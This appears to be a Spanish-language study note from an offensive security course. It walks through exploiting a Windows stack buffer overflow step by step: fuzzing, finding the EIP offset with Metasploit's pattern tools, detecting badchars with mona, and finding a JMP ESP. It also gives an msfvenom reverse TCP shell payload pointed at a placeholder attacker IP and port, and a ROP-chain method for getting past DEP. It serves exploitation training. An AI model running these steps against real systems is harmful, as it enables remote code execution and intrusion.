tags: #temario #master #tecnica #explotacion 

---
Pasos para realizar un ataque de buffer overflow a un binario:

- Cargamos el programa a immunity debuger
- Creamos con python un fuzzer como **proof of content** (POC)
- Usar pattern create para averiguar el offset exacto donde desborda el programa
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <lengt desbordado>
 ```
- Introducimos la cadena que nos retorna como buffer a enviar en nuestro script python
- En inmunity debguger copiamos la dirección del EIP al desbordar con este nuevo buffer y eso lo pegamos en el siguiente comando para que nos retorne el offset de desbordamiento
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <direccion del EIP>
```
- Ahora que tenemos el offset exacto de donde desborda el programa y empieza a escribir en el EIP podemos modificar el buffer para poner una dirección de salto
```python
buffer = "A" * offset + "B" * 4
```
Esto debería de retornar 42424242 en el EIP si se hizo de manera correcta
- Deberemos detectar ahora los badchars como \x00, para eso desde el immunity debuger crearemos una carpeta con mona en el directorio que especifiquemos
```
!mona config -set workingfolder C:/Users/Admin/Desktop/%p
!mona bytearray
```
Pegamos el resultado de bytearray a continuacion del buffer que generamos para sobreescribir el EIP y con eso veremos que caracteres nos retorna como badchars. En este punto deberemos de enviar el buffer varias veces hasta detectar todos los badchars y nuestra cadena salga completa.
(ESP follow in dump) y ahi comprobamos hasta que salga la cadena correcta
- Generamos el payload con msfvenom
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<ip-atacante> LPORT=<puerto-atacante> EXITFUNC=thread -b "\x00" -f c
```
Este shellcode lo ponemos a continuación de EIP
- Ahora toca encontrar un punto de salto valido del ESP y lo haremos usando mona con el siguiente comando e introduciendo los badchars encontrados 
```
!mona jmp -r esp -cpb "\x00"
```
este comando nos retornara la dirección que deberemos de poner en el EIP para que la siguiente instrucción no lleve a un jum ESP y podamos ejecutar nuestro payload.


EVASION DEP

Si encontramos protección por parte del sistema DEP podemos saltarnos la protección con cadenas ROP. Para ello deberemos de ejecutar el siguiente comando mona
```immunity debuger
!mona rop -m * -cpb '\x00'
```

Del código que nos retorna este comando en la carpeta que previamente definimos en los pasos anteriores deberemos de copiar el que corresponda con el lenguaje de programación que estamos usando, en este caso python. Copiamos el codigo en nuestro exploit sustituyendo el codigi que va en el EIP e importar la sibreria struct

al terminar añadiremos al final del payload un paddin talque 
```
padding = "F" * (3000 - offset - len(variableNops) - len(payload))
```